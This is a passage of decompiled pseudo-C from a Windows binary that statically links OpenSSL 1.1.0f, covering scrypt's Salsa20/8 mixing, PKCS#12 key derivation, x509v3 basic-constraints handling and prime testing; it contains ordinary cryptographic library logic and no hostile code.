          goto LABEL_12;
        }
      }
      sub_140024610(34, 102, 106, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_bcons.c", 75);
      sub_140023A40(6, "section:", *v8, ",name:", v8[1], ",value:", v8[2]);
LABEL_16:
      sub_140051250((unsigned int *)v4, (__int64)&unk_14011C6A0);
      return 0i64;
    }
  }
  else
  {
    sub_140024610(34, 102, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_bcons.c", 63);
    return 0i64;
  }
}
// 14011C6F4: using guessed type char byte_14011C6F4;

//----- (00000001400ACDA0) ----------------------------------------------------
void __fastcall sub_1400ACDA0(unsigned int *a1)
{
  sub_140051250(a1, (__int64)&unk_14011C6A0);
}

//----- (00000001400ACDC0) ----------------------------------------------------
void __fastcall sub_1400ACDC0(unsigned int *a1)
{
  sub_140051250(a1, (__int64)&unk_14011C770);
}

//----- (00000001400ACDE0) ----------------------------------------------------
void *sub_1400ACDE0()
{
  return &unk_14011C770;
}

//----- (00000001400ACDF0) ----------------------------------------------------
void __fastcall sub_1400ACDF0(unsigned int *a1)
{
  sub_140051250(a1, (__int64)&unk_14011C820);
}

//----- (00000001400ACE10) ----------------------------------------------------
void *sub_1400ACE10()
{
  return &unk_14011C820;
}

//----- (00000001400ACE20) ----------------------------------------------------
void __fastcall sub_1400ACE20(unsigned int *a1)
{
  sub_140051250(a1, (__int64)&unk_14011C8E0);
}

//----- (00000001400ACE40) ----------------------------------------------------
void *sub_1400ACE40()
{
  return &unk_14011C8E0;
}

//----- (00000001400ACE50) ----------------------------------------------------
__int64 __fastcall sub_1400ACE50(
        char *a1,
        int a2,
        __int64 a3,
        unsigned int a4,
        unsigned __int64 a5,
        unsigned __int64 a6,
        unsigned __int64 a7,
        __int64 a8,
        char *a9,
        int a10)
{
  BOOL v11; // r13d
  unsigned __int64 v12; // rbx
  __int64 result; // rax
  unsigned __int64 v14; // r14
  __int64 v15; // rcx
  size_t v16; // rbp
  unsigned __int64 v17; // rcx
  char *v18; // r15
  __int64 v19; // r12
  int *v20; // rax
  unsigned __int8 *v21; // rbp
  int *v22; // rax
  size_t v23; // [rsp+40h] [rbp-58h]
  _DWORD *v28; // [rsp+C8h] [rbp+30h]

  v11 = 0;
  if ( !a6 )
    return 0i64;
  v12 = a7;
  if ( !a7
    || a5 < 2
    || ((a5 - 1) & a5) != 0
    || a7 > 0x3FFFFFFF / a6
    || 16 * a6 <= 0x3F && a5 >= 1i64 << (16 * (unsigned __int8)a6) )
  {
    return 0i64;
  }
  v14 = (a7 * a6) << 7;
  if ( a5 + 2 > 0x1FFFFFFFFFFFFFFi64 / a6 )
    return 0i64;
  v15 = (a6 * (a5 + 2)) << 7;
  if ( v14 > ~v15 )
    return 0i64;
  v16 = v15 + v14;
  v17 = 0x2000000i64;
  if ( a8 )
    v17 = a8;
  v23 = v16;
  if ( v16 <= v17 )
  {
    if ( a9 )
    {
      result = (__int64)sub_14001D8E0(v16);
      v18 = (char *)result;
      if ( result )
      {
        v19 = a6 << 7;
        v28 = (_DWORD *)((a6 << 7) + (a6 << 7) + v14 + result);
        v20 = (int *)sub_14005BAE0();
        if ( (unsigned int)sub_140061CE0(a1, a2, a3, a4, 1, v20, ((int)a7 * (int)a6) << 7, v18) )
        {
          v21 = (unsigned __int8 *)v18;
          do
          {
            sub_1400AD560(v21, a6, a5, (unsigned __int64)&v18[v14], (const __m128i *)&v18[v14 + v19], v28);
            v21 += v19;
            --v12;
          }
          while ( v12 );
          v16 = v23;
          v22 = (int *)sub_14005BAE0();
          v11 = sub_140061CE0(a1, a2, (__int64)v18, (unsigned int)v14, 1, v22, a10, a9) != 0;
        }
        sub_14001DA40(v18, v16, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\evp\\scrypt.c", 0xF5u);
        return v11;
      }
    }
    else
    {
      return 1i64;
    }
  }
  else
  {
    sub_140024610(6, 181, 172, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\evp\\scrypt.c", 219);
    return 0i64;
  }
  return result;
}
// 1400AD01F: conditional instruction was optimized away because %arg_30.8!=0

//----- (00000001400AD0F0) ----------------------------------------------------
__int64 __fastcall sub_1400AD0F0(__int64 a1, const __m128i *a2, __int64 a3)
{
  const __m128i *v3; // rbx
  __int128 v4; // xmm1
  __int128 v5; // xmm0
  __int128 v6; // xmm1
  unsigned __int64 v7; // rcx
  __int32 v8; // eax
  __m128i v9; // xmm1
  int v10; // r14d
  int v11; // r15d
  int v12; // r12d
  int v13; // r13d
  int v14; // r10d
  int v15; // r11d
  int v16; // edi
  int v17; // esi
  int v18; // ecx
  int v19; // edx
  int v20; // r8d
  int v21; // r9d
  int v22; // eax
  int v23; // ebx
  int v24; // r13d
  int v25; // esi
  int v26; // r9d
  int v27; // edi
  int v28; // r8d
  int v29; // r12d
  int v30; // edx
  int v31; // r15d
  int v32; // r11d
  int v33; // ebx
  int v34; // r14d
  int v35; // r10d
  int v36; // ecx
  __int64 v37; // rax
  __int128 v38; // xmm1
  unsigned __int64 v39; // rcx
  __int128 v40; // xmm0
  __int128 v41; // xmm1
  __int64 v43; // [rsp+20h] [rbp-E0h]
  int v44; // [rsp+28h] [rbp-D8h]
  int v45; // [rsp+2Ch] [rbp-D4h]
  __int64 v46; // [rsp+30h] [rbp-D0h]
  const __m128i *v47; // [rsp+38h] [rbp-C8h]
  unsigned __int64 v48; // [rsp+40h] [rbp-C0h]
  unsigned __int64 i; // [rsp+58h] [rbp-A8h]
  __m128i v52; // [rsp+60h] [rbp-A0h] BYREF
  __int128 v53; // [rsp+70h] [rbp-90h] BYREF
  __int128 v54; // [rsp+80h] [rbp-80h]
  __int128 v55; // [rsp+90h] [rbp-70h]
  __m128i v56; // [rsp+A0h] [rbp-60h] BYREF
  __int128 v57; // [rsp+B0h] [rbp-50h] BYREF
  __int128 v58; // [rsp+C0h] [rbp-40h]
  __int128 v59; // [rsp+D0h] [rbp-30h] BYREF

  v3 = a2;
  v48 = 0i64;
  v4 = (__int128)a2[8 * a3 - 3];
  v56 = a2[8 * a3 - 4];
  v5 = (__int128)a2[8 * a3 - 2];
  v57 = v4;
  v6 = (__int128)a2[8 * a3 - 1];
  v58 = v5;
  v59 = v6;
  for ( i = 2 * a3; v48 < i; *(_OWORD *)(v39 + a1 + 48) = v41 )
  {
    v7 = 0i64;
    if ( &v56 > (__m128i *)((char *)&v3[3].m128i_u64[1] + 4) || (char *)&v59 + 12 < (char *)v3 )
    {
      do
      {
        *(__m128i *)((char *)&v56 + 4 * v7) = _mm_xor_si128(
                                                _mm_loadu_si128(v3),
                                                _mm_loadu_si128((__m128i *)((char *)&v56 + 4 * v7)));
        v9 = _mm_loadu_si128(v3 + 1);
        v3 += 2;
        *(__int128 *)((char *)&v57 + 4 * v7) = (__int128)_mm_xor_si128(
                                                           v9,
                                                           _mm_loadu_si128((const __m128i *)((char *)&v57 + 4 * v7)));
        v7 += 8i64;
      }
      while ( v7 < 0x10 );
    }
    else
    {
      do
      {
        v8 = v3->m128i_i32[0];
        v3 = (const __m128i *)((char *)v3 + 4);
        v56.m128i_i32[v7++] ^= v8;
      }
      while ( v7 < 0x10 );
    }
    v52 = v56;
    v53 = v57;
    v10 = HIDWORD(v57);
    v11 = DWORD2(v57);
    v12 = DWORD1(v57);
    v13 = v57;
    v54 = v58;
    v14 = HIDWORD(v58);
    v15 = DWORD2(v58);
    v16 = DWORD1(v58);
    v17 = v58;
    v55 = v59;
    v18 = HIDWORD(v59);
    v19 = DWORD2(v59);
    v20 = DWORD1(v59);
    v21 = v59;
    v43 = *(__int64 *)((char *)v56.m128i_i64 + 4);
    v22 = v56.m128i_i32[0];
    v47 = v3;
    v23 = v56.m128i_i32[3];
    v44 = v56.m128i_i32[0];
    v46 = 4i64;
    do
    {
      v24 = __ROL4__(v21 + v22, 7) ^ v13;
      v25 = __ROL4__(v24 + v44, 9) ^ v17;
      v45 = __ROL4__(v25 + v24, 13) ^ v21;
      v26 = __ROR4__(v25 + v45, 14) ^ v44;
      v27 = __ROL4__(v12 + v43, 7) ^ v16;
      v28 = __ROL4__(v27 + v12, 9) ^ v20;
      LODWORD(v43) = __ROL4__(v28 + v27, 13) ^ v43;
      v29 = __ROR4__(v28 + v43, 14) ^ v12;
      v30 = __ROL4__(v11 + v15, 7) ^ v19;
      HIDWORD(v43) ^= __ROL4__(v30 + v15, 9);
      v31 = __ROL4__(v30 + HIDWORD(v43), 13) ^ v11;
      v32 = __ROR4__(v31 + HIDWORD(v43), 14) ^ v15;
      v33 = __ROL4__(v14 + v18, 7) ^ v23;
      v34 = __ROL4__(v33 + v18, 9) ^ v10;
      v35 = __ROL4__(v34 + v33, 13) ^ v14;
      v36 = __ROR4__(v34 + v35, 14) ^ v18;
      LODWORD(v43) = __ROL4__(v33 + v26, 7) ^ v43;
      HIDWORD(v43) ^= __ROL4__(v26 + v43, 9);
      v52.m128i_i32[2] = HIDWORD(v43);
      v23 = __ROL4__(v43 + HIDWORD(v43), 13) ^ v33;
      v11 = __ROL4__(v29 + v24, 7) ^ v31;
      v44 = __ROR4__(v23 + HIDWORD(v43), 14) ^ v26;
      v52.m128i_i64[0] = __PAIR64__(v43, v44);
      v10 = __ROL4__(v11 + v29, 9) ^ v34;
      v13 = __ROL4__(v10 + v11, 13) ^ v24;
      v12 = __ROR4__(v10 + v13, 14) ^ v29;
      v14 = __ROL4__(v32 + v27, 7) ^ v35;
      v17 = __ROL4__(v14 + v32, 9) ^ v25;
      v16 = __ROL4__(v14 + v17, 13) ^ v27;
      v15 = __ROR4__(v16 + v17, 14) ^ v32;
      v21 = __ROL4__(v36 + v30, 7) ^ v45;
      LODWORD(v55) = v21;
      v20 = __ROL4__(v36 + v21, 9) ^ v28;
      v19 = __ROL4__(v20 + v21, 13) ^ v30;
      v18 = __ROR4__(v19 + v20, 14) ^ v36;
      v22 = v44;
      --v46;
    }
    while ( v46 );
    v52.m128i_i32[3] = v23;
    v37 = 0i64;
    v3 = v47;
    *((_QWORD *)&v55 + 1) = __PAIR64__(v18, v19);
    DWORD1(v55) = v20;
    *((_QWORD *)&v54 + 1) = __PAIR64__(v14, v15);
    *(_QWORD *)&v54 = __PAIR64__(v16, v17);
    *((_QWORD *)&v53 + 1) = __PAIR64__(v10, v11);
    *(_QWORD *)&v53 = __PAIR64__(v12, v13);
    do
    {
      *(__m128i *)((char *)&v56 + v37) = _mm_add_epi32(
                                           _mm_loadu_si128((__m128i *)((char *)&v52 + v37)),
                                           _mm_loadu_si128((__m128i *)((char *)&v56 + v37)));
      *(__int128 *)((char *)&v57 + v37) = (__int128)_mm_add_epi32(
                                                      _mm_loadu_si128((const __m128i *)((char *)&v53 + v37)),
                                                      _mm_loadu_si128((const __m128i *)((char *)&v57 + v37)));
      v37 += 32i64;
    }
    while ( v37 < 64 );
    sub_140023440((__int64)&v52, 64i64);
    v38 = v57;
    v39 = (v48 >> 1) + a3 * (v48 & 1);
    ++v48;
    v39 <<= 6;
    *(__m128i *)(v39 + a1) = v56;
    v40 = v58;
    *(_OWORD *)(v39 + a1 + 16) = v38;
    v41 = v59;
    *(_OWORD *)(v39 + a1 + 32) = v40;
  }
  return sub_140023440((__int64)&v56, 64i64);
}

//----- (00000001400AD560) ----------------------------------------------------
__int64 __fastcall sub_1400AD560(
        unsigned __int8 *a1,
        __int64 a2,
        unsigned __int64 a3,
        unsigned __int64 a4,
        const __m128i *a5,
        _DWORD *a6)
{
  _DWORD *v6; // rbx
  _BYTE *v8; // rdi
  unsigned __int64 v9; // rsi
  __int64 v12; // r9
  int v13; // eax
  unsigned __int64 v14; // r15
  __int64 v15; // rbp
  __int64 result; // rax
  unsigned __int64 v17; // rbp
  unsigned __int64 v18; // r15
  const __m128i *v19; // rax
  unsigned __int64 v20; // r8
  unsigned __int64 v21; // rdx
  const __m128i *v22; // rcx
  unsigned __int64 v23; // rdx
  __m128i v24; // xmm0
  __m128i v25; // xmm1
  const __m128i *v26; // rdx
  unsigned __int64 v27; // r8
  int v28; // ecx
  int v29; // ecx
  unsigned int v30; // ecx
  _BYTE *v31; // [rsp+50h] [rbp+8h]

  v31 = a1;
  v6 = a6;
  v8 = a1;
  v9 = 32 * a2;
  if ( 32 * a2 )
  {
    v12 = 32 * a2;
    do
    {
      v13 = *a1;
      a1 += 4;
      *v6 = v13;
      *v6 |= *(a1 - 3) << 8;
      *v6 |= *(a1 - 2) << 16;
      *v6++ |= *(a1 - 1) << 24;
      --v12;
    }
    while ( v12 );
  }
  if ( a3 > 1 )
  {
    v14 = a3 - 1;
    v15 = a2 << 7;
    do
    {
      sub_1400AD0F0((__int64)v6, (const __m128i *)((char *)v6 - v15), a2);
      v6 = (_DWORD *)((char *)v6 + v15);
      --v14;
    }
    while ( v14 );
  }
  result = sub_1400AD0F0(a4, (const __m128i *)((char *)a6 + a2 * ((a3 << 7) - 128)), a2);
  v17 = 0i64;
  if ( a3 )
  {
    v18 = a3;
    do
    {
      v19 = (const __m128i *)&a6[32 * a2 * (*(unsigned int *)((a2 << 7) + a4 - 64) % a3)];
      if ( v9 )
      {
        if ( v9 < 8
          || (v20 = 0i64,
              v21 = (unsigned __int64)&a5[v9 / 4 - 1].m128i_u64[1] + 4,
              a5 <= (const __m128i *)((char *)&v19[v9 / 4 - 1].m128i_u64[1] + 4))
          && v21 >= (unsigned __int64)v19
          || (unsigned __int64)a5 <= a4 - 4 + 4 * v9 && v21 >= a4 )
        {
          v26 = a5;
          v27 = v9;
          do
          {
            v28 = *(__int32 *)((char *)v26->m128i_i32 + a4 - (_QWORD)a5);
            v26 = (const __m128i *)((char *)v26 + 4);
            v29 = v19->m128i_i32[0] ^ v28;
            v19 = (const __m128i *)((char *)v19 + 4);
            v26[-1].m128i_i32[3] = v29;
            --v27;
          }
          while ( v27 );
        }
        else
        {
          v22 = a5 + 1;
          v23 = a4 - (_QWORD)a5;
          do
          {
            v24 = _mm_loadu_si128(v19);
            v20 += 8i64;
            v19 += 2;
            v25 = _mm_loadu_si128((const __m128i *)((char *)v22 + v23 - 16));
            v22 += 2;
            v22[-3] = _mm_xor_si128(v25, v24);
            v22[-2] = _mm_xor_si128(
                        _mm_loadu_si128((const __m128i *)((char *)v22 + v23 - 32)),
                        _mm_loadu_si128(v19 - 1));
          }
          while ( v20 < v9 );
        }
      }
      result = sub_1400AD0F0(a4, a5, a2);
      --v18;
    }
    while ( v18 );
    v8 = v31;
  }
  if ( v9 )
  {
    do
    {
      v30 = *(_DWORD *)(a4 + 4 * v17);
      *v8 = v30;
      v8 += 4;
      ++v17;
      *(v8 - 3) = BYTE1(v30);
      result = HIWORD(v30);
      *(v8 - 2) = BYTE2(v30);
      *(v8 - 1) = HIBYTE(v30);
    }
    while ( v17 < v9 );
  }
  return result;
}

//----- (00000001400AD790) ----------------------------------------------------
__int64 __fastcall sub_1400AD790(__int64 a1, int a2, __int64 a3, int a4, char a5, int a6, int a7, char *a8, int *a9)
{
  unsigned int v9; // ebp
  void *v11; // rsi
  _DWORD *v12; // rbx
  _DWORD *v13; // r14
  __int64 *v15; // r12
  size_t v16; // rbp
  int v17; // eax
  size_t v18; // rdi
  _BYTE *v19; // rdi
  int v20; // r14d
  _DWORD *v21; // rax
  _BYTE *v22; // rdi
  int i; // r8d
  int v24; // eax
  int j; // r8d
  int v26; // eax
  int v27; // edx
  int v28; // r14d
  int v29; // edi
  int v30; // eax
  int v31; // edi
  _BYTE *v32; // r8
  int v33; // eax
  int v34; // edx
  __int64 v35; // rdi
  int k; // esi
  _BYTE *v37; // r14
  int v38; // eax
  __int64 v39; // rdi
  _BYTE *v40; // rdx
  __int64 v42; // [rsp+30h] [rbp-88h]
  void *Src; // [rsp+38h] [rbp-80h]
  _BYTE *v44; // [rsp+40h] [rbp-78h]
  int v45; // [rsp+48h] [rbp-70h]
  void *v46; // [rsp+50h] [rbp-68h]
  int v47; // [rsp+58h] [rbp-60h]
  _BYTE *v48; // [rsp+60h] [rbp-58h]

  v9 = 0;
  v48 = 0i64;
  v11 = 0i64;
  v46 = 0i64;
  v12 = 0i64;
  v44 = 0i64;
  v13 = 0i64;
  v15 = (__int64 *)sub_14006DFD0();
  if ( v15 )
  {
    v16 = (int)sub_1400252D0((__int64)a9);
    v17 = sub_1400253D0((__int64)a9);
    v18 = v17;
    v47 = v17;
    if ( v17 >= 0 && (int)v16 > 0 )
    {
      v46 = sub_14001D8E0(v16);
      Src = sub_14001D8E0(v18);
      v19 = sub_14001D8E0((int)v16 + 1);
      v48 = v19;
      v20 = v16 + a4 - 1 - ((int)v16 + a4 - 1) % (int)v16;
      if ( a2 )
        LODWORD(v11) = v16 + a2 - 1 - ((int)v16 + a2 - 1) % (int)v16;
      v45 = (_DWORD)v11 + v20;
      v44 = sub_14001D8E0((int)v11 + v20);
      v12 = sub_140027200();
      v21 = sub_140027200();
      v42 = (__int64)v21;
      if ( v46 && Src && v19 && v44 && v12 && v21 )
      {
        memset(v46, a5, v16);
        v22 = v44;
        for ( i = 0; i < v20; ++v22 )
        {
          v24 = i++;
          *v22 = *(_BYTE *)(v24 % a4 + a3);
        }
        for ( j = 0; j < (int)v11; *(v22 - 1) = *(_BYTE *)((int)(__SPAIR64__(v27, v26) % a2) + a1) )
        {
          ++v22;
          v26 = j;
          v27 = j++ >> 31;
        }
        if ( (unsigned int)sub_14006DB20((__int64)v15, a9, 0i64) )
        {
          v28 = a6;
          while ( (unsigned int)sub_14006DD90((__int64)v15) )
          {
            v11 = Src;
            if ( !(unsigned int)sub_14006DD90((__int64)v15) || !(unsigned int)sub_14006DA80(v15, (__int64)Src, 0i64) )
              goto LABEL_47;
            v29 = 1;
            if ( v28 > 1 )
            {
              while ( (unsigned int)sub_14006DB20((__int64)v15, a9, 0i64)
                   && (unsigned int)sub_14006DD90((__int64)v15)
                   && (unsigned int)sub_14006DA80(v15, (__int64)Src, 0i64) )
              {
                if ( ++v29 >= v28 )
                  goto LABEL_26;
              }
              goto LABEL_47;
            }
LABEL_26:
            v30 = v47;
            if ( a7 < v47 )
              v30 = a7;
            memmove(a8, Src, v30);
            if ( v47 >= a7 )
            {
              v13 = (_DWORD *)v42;
              v9 = 1;
              goto LABEL_53;
            }
            a8 += v47;
            a7 -= v47;
            v31 = 0;
            v32 = v48;
            do
            {
              ++v32;
              v33 = v31;
              v34 = v31++ >> 31;
              *(v32 - 1) = *((_BYTE *)Src + (int)(__SPAIR64__(v34, v33) % v47));
            }
            while ( v31 < (int)v16 );
            v35 = v42;
            if ( !sub_140026840(v48, v16, v42) || !(unsigned int)sub_14003E600(v42, 1ui64) )
            {
              v13 = (_DWORD *)v42;
              goto LABEL_51;
            }
            for ( k = 0; k < v45; k += v16 )
            {
              v37 = &v44[k];
              if ( !sub_140026840(v37, v16, (__int64)v12)
                || !(unsigned int)sub_140041A10((__int64)v12, (__int64)v12, v35)
                || !(unsigned int)sub_1400269C0((__int64)v12, v48) )
              {
                goto LABEL_46;
              }
              v38 = (int)(sub_140027260((__int64)v12) + 7) / 8;
              v39 = v38;
              if ( v38 <= (int)v16 )
              {
                if ( v38 >= (int)v16 )
                {
                  v40 = &v44[k];
                }
                else
                {
                  memset(v37, 0, (int)v16 - v38);
                  v40 = &v44[k - v39 + v16];
                }
                if ( !(unsigned int)sub_1400269C0((__int64)v12, v40) )
                  goto LABEL_46;
              }
              else
              {
                if ( !(unsigned int)sub_1400269C0((__int64)v12, v48) )
                  goto LABEL_46;
                memmove(v37, v48 + 1, v16);
              }
              v35 = v42;
            }
            v28 = a6;
            if ( !(unsigned int)sub_14006DB20((__int64)v15, a9, 0i64) )
              break;
          }
        }
LABEL_46:
        v11 = Src;
LABEL_47:
        v13 = (_DWORD *)v42;
      }
      else
      {
        v11 = Src;
        v13 = v21;
      }
    }
LABEL_51:
    v9 = 0;
  }
  sub_140024610(35, 111, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\pkcs12\\p12_key.c", 185);
LABEL_53:
  sub_14001D930(v11);
  sub_14001D930(v48);
  sub_14001D930(v46);
  sub_14001D930(v44);
  sub_140026FF0(v12);
  sub_140026FF0(v13);
  sub_14006DF90(v15);
  return v9;
}
// 1400AD90F: conditional instruction was optimized away because ebp.4>=1
// 1400ADAB7: conditional instruction was optimized away because ebp.4>=1

//----- (00000001400ADCF0) ----------------------------------------------------
__int64 __fastcall sub_1400ADCF0(_BYTE *a1, int a2, __int64 a3, int a4, char a5, int a6, int a7, char *a8, int *a9)
{
  int v11; // edx
  int v13; // ebx
  int v14[2]; // [rsp+50h] [rbp-18h] BYREF
  int v15; // [rsp+70h] [rbp+8h] BYREF

  if ( a1 )
  {
    if ( !sub_1400BE310(a1, a2, v14, &v15) )
    {
      sub_140024610(35, 116, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\pkcs12\\p12_key.c", 65);
      return 0i64;
    }
    a1 = *(_BYTE **)v14;
    v11 = v15;
  }
  else
  {
    *(_QWORD *)v14 = 0i64;
    v11 = 0;
    v15 = 0;
  }
  v13 = sub_1400AD790((__int64)a1, v11, a3, a4, a5, a6, a7, a8, a9);
  if ( v13 <= 0 )
    return 0i64;
  sub_14001DA40(*(void **)v14, v15, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\pkcs12\\p12_key.c", 0x48u);
  return (unsigned int)v13;
}

//----- (00000001400ADDE0) ----------------------------------------------------
__int64 __fastcall sub_1400ADDE0(__int64 a1, unsigned int a2, unsigned int a3)
{
  int v4; // ecx
  void (__fastcall *v6)(_QWORD, _QWORD, _QWORD); // rax

  if ( !a1 )
    return 1i64;
  v4 = *(_DWORD *)a1 - 1;
  if ( !v4 )
  {
    v6 = *(void (__fastcall **)(_QWORD, _QWORD, _QWORD))(a1 + 16);
    if ( v6 )
      v6(a2, a3, *(_QWORD *)(a1 + 8));
    return 1i64;
  }
  if ( v4 == 1 )
    return (*(__int64 (__fastcall **)(_QWORD, _QWORD, __int64))(a1 + 16))(a2, a3, a1);
  else
    return 0i64;
}

//----- (00000001400ADE40) ----------------------------------------------------
__int64 __fastcall sub_1400ADE40(__int64 **a1, int a2, int a3, __int64 a4, __int64 a5, __int64 a6)
{
  unsigned int v6; // esi
  unsigned int v9; // ebx
  int *v10; // rbp
  int v11; // edi
  int *v13; // rax
  __int64 **v14; // r13
  __int64 i; // rcx
  unsigned int v16; // r12d
  int v17; // eax
  int v18; // eax
  int v19; // eax
  int j; // ebx
  int v21; // eax
  int v22; // eax
  void *v23; // [rsp+30h] [rbp-48h]
  unsigned int v24; // [rsp+88h] [rbp+10h]

  v6 = 0;
  v9 = 0;
  v10 = 0i64;
  if ( a2 < 1300 )
  {
    if ( a2 < 850 )
    {
      if ( a2 < 650 )
      {
        if ( a2 < 550 )
        {
          if ( a2 < 450 )
          {
            if ( a2 < 400 )
            {
              if ( a2 < 350 )
              {
                if ( a2 < 300 )
                {
                  if ( a2 < 250 )
                  {
                    if ( a2 < 200 )
                    {
                      v11 = 27;
                      if ( a2 >= 150 )
                        v11 = 18;
                    }
                    else
                    {
                      v11 = 15;
                    }
                  }
                  else
                  {
                    v11 = 12;
                  }
                }
                else
                {
                  v11 = 9;
                }
              }
              else
              {
                v11 = 8;
              }
            }
            else
            {
              v11 = 7;
            }
          }
          else
          {
            v11 = 6;
          }
        }
        else
        {
          v11 = 5;
        }
      }
      else
      {
        v11 = 4;
      }
    }
    else
    {
      v11 = 3;
    }
  }
  else
  {
    v11 = 2;
  }
  if ( a2 < 2 )
  {
    sub_140024610(3, 141, 118, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\bn\\bn_prime.c", 113);
    return 0i64;
  }
  if ( a2 == 2 && a3 )
  {
    sub_140024610(3, 141, 118, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\bn\\bn_prime.c", 117);
    return 0i64;
  }
  v23 = sub_14001DC20(0x1000ui64);
  if ( v23 )
  {
    v13 = (int *)sub_140027CD0();
    v10 = v13;
    if ( v13 )
    {
      sub_140027D40(v13);
      v14 = (__int64 **)sub_140027C40(v10);
      if ( v14 )
      {
LABEL_34:
        for ( i = a5; ; i = a5 )
        {
          v16 = v9;
          if ( a4 )
            v17 = a3 ? sub_1400AE860((__int64)a1, a2, a4, i, v10) : sub_1400AE570((__int64)a1, a2, a4, i, v10);
          else
            v17 = sub_1400AE6B0(a1, a2, (__int64)v23);
          if ( !v17 )
            break;
          v18 = sub_1400ADDE0(a6, 0, v9++);
          v24 = v9;
          if ( !v18 )
            break;
          if ( a3 )
          {
            if ( (unsigned int)sub_140047230((__int64)v14, (__int64)a1) )
            {
              for ( j = 0; j < v11; ++j )
              {
                v21 = sub_1400AE180(a1, 1, v10, 0, a6);
                if ( v21 == -1 )
                  goto LABEL_56;
                i = a5;
                if ( !v21 )
                  goto LABEL_33;
                v22 = sub_1400AE180(v14, 1, v10, 0, a6);
                if ( v22 == -1 )
                  goto LABEL_56;
                if ( !v22 )
                {
                  i = a5;
LABEL_33:
                  v9 = v24;
                  goto LABEL_34;
                }
                if ( !(unsigned int)sub_1400ADDE0(a6, 2u, v16) )
                  goto LABEL_56;
              }
LABEL_55:
              v6 = 1;
              goto LABEL_57;
            }
            break;
          }
          v19 = sub_1400AE180(a1, v11, v10, 0, a6);
          if ( v19 == -1 )
            break;
          if ( v19 )
            goto LABEL_55;
        }
LABEL_56:
        v6 = 0;
      }
    }
  }
LABEL_57:
  sub_14001D930(v23);
  if ( v10 )
    sub_140027B60((__int64)v10);
  sub_140027BE0((__int64)v10);
  return v6;
}

//----- (00000001400AE180) ----------------------------------------------------
__int64 __fastcall sub_1400AE180(__int64 **a1, int a2, int *a3, int a4, __int64 a5)
{
  int *v6; // rbp
  unsigned int v9; // r15d
  __int64 *v10; // rax
  __int64 result; // rax
  unsigned __int16 *v12; // rbx
  __int64 *v13; // r14
  _QWORD *v14; // r12
  void (__fastcall *v15)(__int64, __int64, _QWORD); // rax
  int i; // r15d
  _DWORD *v17; // rax
  unsigned int v18; // ebx
  int v19; // eax
  __int64 v20; // [rsp+40h] [rbp-38h]
  _QWORD *v21; // [rsp+48h] [rbp-30h]

  v20 = 0i64;
  v6 = a3;
  v9 = -1;
  v10 = (__int64 *)sub_140027650();
  if ( (int)sub_140026AB0((__int64)a1, v10) <= 0 )
    return 0i64;
  if ( !a2 )
  {
    if ( (int)sub_140027260((__int64)a1) < 1300 )
    {
      if ( (int)sub_140027260((__int64)a1) < 850 )
      {
        if ( (int)sub_140027260((__int64)a1) < 650 )
        {
          if ( (int)sub_140027260((__int64)a1) < 550 )
          {
            if ( (int)sub_140027260((__int64)a1) < 450 )
            {
              if ( (int)sub_140027260((__int64)a1) < 400 )
              {
                if ( (int)sub_140027260((__int64)a1) < 350 )
                {
                  if ( (int)sub_140027260((__int64)a1) < 300 )
                  {
                    if ( (int)sub_140027260((__int64)a1) < 250 )
                    {
                      if ( (int)sub_140027260((__int64)a1) < 200 )
                      {
                        a2 = 27;
                        if ( (int)sub_140027260((__int64)a1) >= 150 )
                          a2 = 18;
                      }
                      else
                      {
                        a2 = 15;
                      }
                    }
                    else
                    {
                      a2 = 12;
                    }
                  }
                  else
                  {
                    a2 = 9;
                  }
                }
                else
                {
                  a2 = 8;
                }
              }
              else
              {
                a2 = 7;
              }
            }
            else
            {
              a2 = 6;
            }
          }
          else
          {
            a2 = 5;
          }
        }
        else
        {
          a2 = 4;
        }
      }
      else
      {
        a2 = 3;
      }
    }
    else
    {
      a2 = 2;
    }
  }
  if ( !sub_1400270F0((__int64)a1) )
    return sub_140027130((__int64)a1, 2i64);
  if ( a4 )
  {
    v12 = (unsigned __int16 *)&unk_14011C982;
    while ( 1 )
    {
      result = sub_14003E820((__int64)a1, *v12);
      if ( result == -1 )
        goto LABEL_63;
      if ( !result )
        return result;
      if ( (__int64)++v12 >= (__int64)&unk_14011D980 )
      {
        if ( !a5 )
          break;
        if ( *(_DWORD *)a5 == 1 )
        {
          v15 = *(void (__fastcall **)(__int64, __int64, _QWORD))(a5 + 16);
          if ( v15 )
            v15(1i64, 0xFFFFFFFFi64, *(_QWORD *)(a5 + 8));
        }
        else if ( *(_DWORD *)a5 != 2
               || !(*(unsigned int (__fastcall **)(_QWORD, __int64, __int64))(a5 + 16))(
                     (unsigned int)(*(_DWORD *)a5 - 1),
                     0xFFFFFFFFi64,
                     a5) )
        {
          goto LABEL_63;
        }
        break;
      }
    }
  }
  if ( v6 || (v6 = (int *)sub_140027CD0()) != 0i64 )
  {
    sub_140027D40(v6);
    v13 = sub_140027C40(v6);
    v21 = sub_140027C40(v6);
    v14 = sub_140027C40(v6);
    if ( !v14 || !sub_140026E90((__int64)v13, (__int64)a1) || !(unsigned int)sub_14003E980((__int64)v13, 1ui64) )
      goto LABEL_61;
    if ( sub_140027160((__int64)v13) )
    {
LABEL_43:
      v9 = 0;
      goto LABEL_61;
    }
    for ( i = 1; !(unsigned int)sub_1400270A0((__int64)v13, i); ++i )
      ;
    if ( (unsigned int)sub_140047090((__int64)v21, (__int64)v13, i) )
    {
      v17 = sub_14003C400();
      v20 = (__int64)v17;
      if ( v17 )
      {
        if ( (unsigned int)sub_14003C480((__int64)v17, a1, v6) )
        {
          v18 = 0;
          if ( a2 <= 0 )
          {
LABEL_59:
            v9 = 1;
            goto LABEL_61;
          }
          while ( (unsigned int)sub_1400282C0((__int64)v14, (__int64)v13) )
          {
            if ( !(unsigned int)sub_14003E600((__int64)v14, 1ui64) )
              break;
            v19 = sub_1400AEA40((__int64)v14, (unsigned __int64)a1, v13, (__int64)v21, i, v6, v20);
            if ( v19 == -1 )
              break;
            if ( v19 )
              goto LABEL_43;
            if ( !(unsigned int)sub_1400ADDE0(a5, 1u, v18) )
              break;
            if ( (int)++v18 >= a2 )
              goto LABEL_59;
          }
        }
      }
    }
